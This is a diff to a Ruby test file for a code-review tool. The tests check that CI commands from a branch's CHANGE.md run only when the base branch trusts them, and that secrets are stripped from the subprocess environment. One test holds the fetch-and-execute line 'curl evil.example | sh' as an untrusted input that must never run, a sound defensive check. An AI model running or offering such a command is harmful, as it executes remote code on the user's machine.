@@ -19,7 +19,7 @@ class ReviewStage1Test < Minitest::Test
 
     def initialize = @calls = []
 
-    def call(command, root, _timeout)
+    def call(command, root, _timeout, _env = nil)
       @calls << command
       case command
       when /eslint \./ then eslint(root)
@@ -195,13 +195,24 @@ class ReviewStage1Test < Minitest::Test
   end
 
   def command_lane(run, timeout: nil)
-    extra = timeout ? "\n        timeout_seconds: #{timeout}" : ""
+    extra = "\n        timeout_seconds: #{timeout || 300}"
     "---\nchange_config:\n  lanes:\n    command:\n      enabled: true\n      commands:\n      - name: unit\n        run: #{run}#{extra}\n---\nbody\n"
+  end
+
+  # A repo whose CHANGE.md is committed and also sits at origin/main, so the
+  # lane's entries are the base branch's and run.
+  def base_trusted(dir, change_md)
+    git = ->(*args) { system("git", "-C", dir, "-c", "user.name=t", "-c", "user.email=t@example.com", *args, out: File::NULL) }
+    git.call("init", "-q", "-b", "main")
+    File.write(File.join(dir, "CHANGE.md"), change_md)
+    git.call("add", ".")
+    git.call("commit", "-q", "-m", "base")
+    git.call("update-ref", "refs/remotes/origin/main", "HEAD")
   end
 
   def test_a_real_subprocess_timeout_is_reported
     dir = tmpdir
-    File.write(File.join(dir, "CHANGE.md"), command_lane("sleep 30"))
+    base_trusted(dir, command_lane("sleep 30", timeout: 1))
     row = ReviewStage1.run(dir, timeout: 1).results.find { |r| r.id.start_with?("tests") }
     assert_equal "timed_out", row.status
     assert_equal "sleep 30", row.command
@@ -210,12 +221,53 @@ class ReviewStage1Test < Minitest::Test
   # Test command resolution: the command lane first, then a manifest.
   def test_the_command_lane_supplies_the_test_command
     dir = tmpdir
-    File.write(File.join(dir, "CHANGE.md"), command_lane("make check", timeout: 42))
+    base_trusted(dir, command_lane("make check", timeout: 42))
     File.write(File.join(dir, "package.json"), '{ "scripts": { "test": "vitest" } }')
     tools = Tools.new
     ReviewStage1.run(dir, runner: tools)
     assert_includes tools.calls, "make check"
     refute_includes tools.calls, "npm test", "the lane wins over a manifest"
+  end
+
+  def test_a_lane_entry_the_base_branch_lacks_never_runs
+    dir = tmpdir
+    base_trusted(dir, command_lane("make check"))
+    File.write(File.join(dir, "CHANGE.md"), command_lane("curl evil.example | sh"))
+    File.write(File.join(dir, "package.json"), '{ "scripts": { "test": "vitest" } }')
+    tools = Tools.new
+    ReviewStage1.run(dir, runner: tools)
+    refute_includes tools.calls, "curl evil.example | sh"
+    refute_includes tools.calls, "make check", "the branch's definition replaced the base's, so neither runs"
+    assert_includes tools.calls, "npm test", "tests fall back to the manifest"
+  end
+
+  def test_a_new_lane_entry_in_a_repo_with_no_base_never_runs
+    dir = tmpdir
+    File.write(File.join(dir, "CHANGE.md"), command_lane("make check"))
+    tools = Tools.new
+    ReviewStage1.run(dir, runner: tools)
+    refute_includes tools.calls, "make check"
+  end
+
+  def test_a_trusted_lane_entry_runs_with_the_restricted_environment
+    dir = tmpdir
+    base_trusted(dir, command_lane("make check"))
+    seen = nil
+    runner = lambda do |_command, _root, _timeout, env = nil|
+      seen = env
+      Outcome.new(:pass, 0, "", false)
+    end
+    with_env("CF_STAGE1_SECRET" => "hunter2") { ReviewStage1.run(dir, runner: runner) }
+    refute_nil seen
+    refute_includes seen.keys, "CF_STAGE1_SECRET"
+  end
+
+  def with_env(vars)
+    old = vars.keys.to_h { |key| [ key, ENV.fetch(key, nil) ] }
+    vars.each { |key, value| ENV[key] = value }
+    yield
+  ensure
+    old.each { |key, value| ENV[key] = value }
   end
 
   def test_manifest_test_commands
@@ -248,8 +300,8 @@ class ReviewStage1Test < Minitest::Test
 
   def test_a_failing_test_suite_blocks
     dir = tmpdir
-    File.write(File.join(dir, "CHANGE.md"), command_lane("make check"))
-    failing = lambda do |command, _root, _timeout|
+    base_trusted(dir, command_lane("make check"))
+    failing = lambda do |command, _root, _timeout, _env = nil|
       command == "make check" ? Outcome.new(:fail, 2, "spec.rb:9: boom", false) : Outcome.new(:pass, 0, "", false)
     end
     report = run_stage1(dir, tools: failing)
@@ -280,5 +332,37 @@ class ReviewStage1Test < Minitest::Test
     FileUtils.mkdir_p(File.join(dir, "test/fixtures"))
     File.write(File.join(dir, "test/fixtures/x.txt"), "a #{[ 0x2014 ].pack('U')} b\n")
     assert_equal "passed", result(run_stage1(dir), "glyph").status
+  end
+
+  def test_the_glyph_escape_hatch_is_honored
+    dir = tmpdir
+    system("git", "-C", dir, "init", "-q", "-b", "main", out: File::NULL)
+    File.write(File.join(dir, "new.txt"), "fresh #{[ 0x2014 ].pack('U')} line\n")
+    with_env("CF_ALLOW_GLYPH" => "1") { assert_equal "passed", result(run_stage1(dir), "glyph").status }
+    assert_equal "failed", result(run_stage1(dir), "glyph").status
+  end
+
+  # ESLint judged on its effective config: a rule named but switched off is missing.
+  class PrintConfigTools < Tools
+    def initialize(rules)
+      super()
+      @rules = rules
+    end
+
+    def call(command, root, timeout, env = nil)
+      return Outcome.new(:pass, 0, JSON.generate("rules" => @rules), false) if command.include?("--print-config")
+
+      super
+    end
+  end
+
+  def test_a_disabled_eslint_rule_is_not_an_enforcer
+    dir = copy_fixture("js_var")
+    off = { "no-var" => [ "off" ], "eqeqeq" => "off", "prefer-const" => 0 }
+    row = result(run_stage1(dir, tools: PrintConfigTools.new(off)), "javascript")
+    assert_equal "unavailable", row.status
+    assert_includes row.detail, "no-var, eqeqeq, prefer-const"
+    on = { "no-var" => [ "error" ], "eqeqeq" => [ 2, "always" ], "prefer-const" => "warn" }
+    refute_equal "unavailable", result(run_stage1(dir, tools: PrintConfigTools.new(on)), "javascript").status
   end
 end
